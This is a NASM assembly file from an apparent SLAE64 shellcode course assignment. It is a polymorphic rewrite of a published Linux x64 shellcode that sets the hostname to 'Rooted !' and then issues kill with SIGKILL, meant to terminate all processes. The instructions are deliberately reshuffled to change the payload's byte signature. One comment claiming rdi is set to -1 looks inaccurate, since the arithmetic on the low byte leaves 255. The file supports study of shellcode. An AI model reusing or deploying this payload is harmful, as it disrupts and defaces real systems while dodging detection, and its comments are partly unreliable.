; Student ID     : SLAE64-1611
; Student Name   : Jonathan "Chops" Crosby
; Assignment 6.1 : Polymorphic Conversion of Linux/x64 Shellcode Part One of Three - sethostname() & killall
; File Name      : hostname-killall.nasm
; Shell Storm    : http://shell-storm.org/shellcode/files/shellcode-605.php

global _start

section .text
 
_start:

;-- setHostName("Rooted !");

				; we are changing up how we
				; set rax to 0xaa
xor     rax, rax		; zeroing out rax
add	al, 0x50		; adding 80
add	al, 0x5a		; adding 90
		
				; just changed which register
				; andm moved in via hex instead
mov	r11, 0x21206465746F6F52	; Rooted !
push    r11			; that we used
mov     rdi, rsp		; moving Rooted to rdi

mov	rsi, rax		; moving 0xaa into rsi
sub     sil, 0xa2		; and subing it down to 0x08
		
syscall				; calling sethostname
 

;-- kill(-1, SIGKILL);
				; rax should be a zero already
				; from previous call
add	al, 0x17		; adding 23
add	al, 0x27		; adding 39
mov	rdi, rsi		; moving 8 into rdi from
					; previous function
sub	dil, 0x09		; setting rdi to -1
inc	rsi			; set rsi to 9 for SIGKILL
syscall				; call kill
